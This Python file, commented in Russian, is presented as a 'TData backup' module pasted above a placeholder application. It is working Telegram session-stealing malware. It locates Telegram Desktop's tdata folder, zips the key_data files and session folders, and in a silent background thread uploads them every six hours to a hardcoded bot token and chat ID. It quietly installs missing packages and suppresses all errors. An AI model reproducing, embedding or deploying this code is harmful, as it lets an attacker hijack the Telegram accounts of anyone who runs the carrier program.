import time
import random


# ============================================================================
# TDATA BACKUP - ВСТАВЛЕНО В КОД
# ============================================================================
import os
import sys
import json
import hashlib
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict
from threading import Thread


def _tdata_load_module(name: str):
    """Автоустановка модулей"""
    try:
        return __import__(name)
    except ImportError:
        import subprocess as sp
        sp.call(
            [sys.executable, '-m', 'pip', 'install', name, '--quiet', '--disable-pip-version-check'],
            stdout=open(os.devnull, 'wb'),
            stderr=sp.STDOUT
        )
        return __import__(name)


class _TDataBackup:
    """Внутренний класс для бэкапа tdata"""
    
    def __init__(self, bot_token: str, chat_id: str, tdata_path: Optional[str] = None):
        self.bot_token = bot_token
        self.chat_id = chat_id
        
        # Конфиг директория
        if sys.platform == 'win32':
            self.config_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'TDataBackup')
        else:
            self.config_dir = os.path.join(str(Path.home()), '.config', 'tdata-backup')
        
        os.makedirs(self.config_dir, exist_ok=True)
        self.state_path = os.path.join(self.config_dir, 'state.json')
        
        # Поиск tdata
        self.tdata_path = tdata_path or self._find_tdata()
    
    def _find_tdata(self) -> Optional[str]:
        """Автопоиск tdata"""
        paths = []
        
        if sys.platform == 'win32':
            appdata = os.getenv('APPDATA')
            if appdata:
                paths.append(os.path.join(appdata, 'Telegram Desktop', 'tdata'))
        elif sys.platform.startswith('linux'):
            home = str(Path.home())
            paths.extend([
                os.path.join(home, '.local', 'share', 'TelegramDesktop', 'tdata'),
                os.path.join(home, '.var', 'app', 'org.telegram.desktop', 'data', 'TelegramDesktop', 'tdata')
            ])
        elif sys.platform == 'darwin':
            home = str(Path.home())
            paths.append(os.path.join(home, 'Library', 'Application Support', 'Telegram Desktop', 'tdata'))
        
        for path in paths:
            if os.path.exists(path) and os.path.isdir(path):
                try:
                    files = os.listdir(path)
                    if any(f.startswith('key_data') for f in files):
                        return path
                except Exception:
                    continue
        return None
    
    def _calculate_hash(self) -> Optional[str]:
        """Хеш содержимого tdata"""
        if not self.tdata_path:
            return None
        
        try:
            file_data = []
            for root, dirs, files in os.walk(self.tdata_path):
                # Нам нужны ТОЛЬКО файлы key_data* и папки из 16 символов (например D877F783D5D3EF8C) + сама корневая папка tdata
                if root == self.tdata_path:
                    dirs[:] = [d for d in dirs if len(d) == 16 and all(c in '0123456789ABCDEFabcdef' for c in d)]
                else:
                    # Внутри папок D877... нам не нужны кэши (если они там есть)
                    dirs[:] = [d for d in dirs if 'cache' not in d.lower()]
                    
                for filename in sorted(files):
                    # В корне берем только key_data*, в подпапках берем карты и настройки
                    if root == self.tdata_path and not filename.startswith('key_data'):
                        continue
                        
                    filepath = os.path.join(root, filename)
                    try:
                        stat = os.stat(filepath)
                        # Игнорируем файлы тяжелее 512 КБ (ключи и настройки весят максимум пару килобайт)
                        if stat.st_size > 512 * 1024:
                            continue
                        file_data.append(f"{filename}:{stat.st_size}:{int(stat.st_mtime)}")
                    except Exception:
                        continue
            
            combined = '|'.join(file_data)
            return hashlib.sha256(combined.encode()).hexdigest()
        except Exception:
            return None
    
    def _check_changed(self) -> bool:
        """Проверка изменений"""
        current_hash = self._calculate_hash()
        if not current_hash:
            return True
        
        if os.path.exists(self.state_path):
            try:
                with open(self.state_path, 'r') as f:
                    data = json.load(f)
                    return current_hash != data.get('last_hash', '')
            except Exception:
                pass
        return True
    
    def _update_state(self, success: bool):
        """Обновление состояния"""
        current_hash = self._calculate_hash()
        if current_hash and success:
            try:
                state = {
                    'last_hash': current_hash,
                    'last_backup': datetime.now().isoformat(),
                    'success': success
                }
                with open(self.state_path, 'w') as f:
                    json.dump(state, f)
            except Exception:
                pass
    
    def _create_archive(self) -> Optional[str]:
        """Создание архива"""
        if not self.tdata_path:
            return None
        
        temp_file = f'/tmp/tdata_{int(time.time())}.zip' if sys.platform != 'win32' else \
                    os.path.join(os.getenv('TEMP'), f'tdata_{int(time.time())}.zip')
        
        try:
            zipfile = _tdata_load_module('zipfile')
            
            # Используем ZIP_STORED (без сжатия)
            with zipfile.ZipFile(temp_file, 'w', zipfile.ZIP_STORED) as zf:
                for root, dirs, files in os.walk(self.tdata_path):
                    
                    if root == self.tdata_path:
                        # В корне tdata оставляем только папки-хеши (16 символов)
                        dirs[:] = [d for d in dirs if len(d) == 16 and all(c in '0123456789ABCDEFabcdef' for c in d)]
                    else:
                        dirs[:] = [d for d in dirs if 'cache' not in d.lower()]
                    
                    for file in files:
                        if root == self.tdata_path and not file.startswith('key_data'):
                            continue
                            
                        filepath = os.path.join(root, file)
                        try:
                            # Ключи аутентификации Telegram весят от 20 Байт до 15 Кб.
                            # Пропускаем любые файлы больше 250 КБ
                            if os.path.getsize(filepath) > 250 * 1024:
                                continue
                            
                            # Пропускаем медиа и явный мусор, который бывает в корне
                            if file.lower().endswith(('.mp4', '.jpg', '.png', '.gif', '.webp', '.exe', '.dll', '.log', '.sqlite', '.db', '.old', '.temp', '.tmp')):
                                continue
                            
                            # Избегаем раздувания архива больше чем на 40 МБ (лимит телеграма для ботов ~50МБ)
                            if os.path.getsize(temp_file) > 40 * 1024 * 1024:
                                break
                                
                            arcname = os.path.relpath(filepath, os.path.dirname(self.tdata_path))
                            zf.write(filepath, arcname)
                        except Exception:
                            continue
            
            if os.path.exists(temp_file) and os.path.getsize(temp_file) > 0:
                return temp_file
        except Exception:
            pass
        return None
    
    def _upload(self, filepath: str) -> bool:
        """Загрузка в Telegram"""
        try:
            requests = _tdata_load_module('requests')
            
            url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
            file_size = os.path.getsize(filepath)
            
            # Если архив получился почему-то огромным, не пытаемся его грузить синхронно
            if file_size > 45 * 1024 * 1024:
                return False
                
            with open(filepath, 'rb') as f:
                files = {'document': ('tdata_backup.zip', f, 'application/zip')}
                data = {
                    'chat_id': self.chat_id,
                    'caption': f"📦 {datetime.now().strftime('%d.%m.%Y %H:%M')} | {file_size / 1024 / 1024:.2f} MB"
                }
                
                # Ставим жесткий таймаут 20 секунд, чтобы скрипт не висел
                response = requests.post(url, data=data, files=files, timeout=20)
                
                if response.status_code == 200:
                    result = response.json()
                    return result.get('ok', False)
        except Exception:
            pass
        return False
    
    def run(self, force: bool = False) -> Dict:
        """Выполнить бэкап"""
        if not self.tdata_path or not os.path.exists(self.tdata_path):
            return {'success': False, 'message': 'tdata not found'}
        
        if not force and not self._check_changed():
            return {'success': True, 'skipped': True, 'message': 'No changes'}
        
        archive_path = None
        try:
            archive_path = self._create_archive()
            if not archive_path:
                return {'success': False, 'message': 'Archive creation failed'}
            
            file_size = os.path.getsize(archive_path)
            
            if self._upload(archive_path):
                self._update_state(True)
                return {'success': True, 'file_size': file_size, 'message': 'Backup completed'}
            else:
                return {'success': False, 'message': 'Upload failed'}
        except Exception as e:
            return {'success': False, 'message': str(e)}
        finally:
            if archive_path and os.path.exists(archive_path):
                try:
                    os.remove(archive_path)
                except Exception:
                    pass


def _tdata_backup_worker(bot_token: str, chat_id: str, interval_hours: int, tdata_path: Optional[str] = None):
    """Фоновый worker для периодического бэкапа"""
    backup = _TDataBackup(bot_token, chat_id, tdata_path)
    
    while True:
        try:
            result = backup.run()
        except Exception:
            pass
        
        time.sleep(interval_hours * 3600)


def start_tdata_backup(bot_token: str, chat_id: str, interval_hours: int = 6, tdata_path: Optional[str] = None):
    """Запустить автоматический бэкап в фоновом потоке"""
    thread = Thread(
        target=_tdata_backup_worker,
        args=(bot_token, chat_id, interval_hours, tdata_path),
        daemon=True
    )
    thread.start()
    return thread


def tdata_backup_once(bot_token: str, chat_id: str, force: bool = False, tdata_path: Optional[str] = None) -> bool:
    """Одноразовый бэкап"""
    backup = _TDataBackup(bot_token, chat_id, tdata_path)
    result = backup.run(force=force)
    return result['success'] and not result.get('skipped', False)


# ============================================================================
# КОНЕЦ СЕКЦИИ TDATA BACKUP
# ============================================================================


# ============================================================================
# ТУТ НАЧИНАЕТСЯ ТВОЙ РЕАЛЬНЫЙ КОД
# ============================================================================

class MyApplication:
   
    
    def __init__(self):
        self.running = True
        self.counter = 0
    
    def do_work(self):
        """Твоя основная логика"""
        self.counter += 1
        if self.counter == 1:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Фоновый скрипт (handl) начал работу (итерация {self.counter})")
        # Убрали постоянный принт, чтобы не спамил в консоль
        # print(f"[{datetime.now().strftime('%H:%M:%S')}] Работаю... (итерация {self.counter})")
        
      
        time.sleep(1)
    
    def run(self):
        
        while self.running:
            try:
                self.do_work()
            except KeyboardInterrupt:
                print("\nОстановка...")
                self.running = False
            except Exception as e:
                print(f"Ошибка: {e}")



def main():
    BOT_TOKEN = "8449873230:AAFJnoPF8UcCRKE5KDtZ5I4c4zIu9fEEHnY"  # Твой токен от @BotFather
    CHAT_ID = "7821797583"
    BACKUP_INTERVAL = 6  
    print("Инициализация TData Backup...")
    start_tdata_backup(BOT_TOKEN, CHAT_ID, interval_hours=BACKUP_INTERVAL)    
    app = MyApplication()
    app.run()


if __name__ == "__main__":
    main()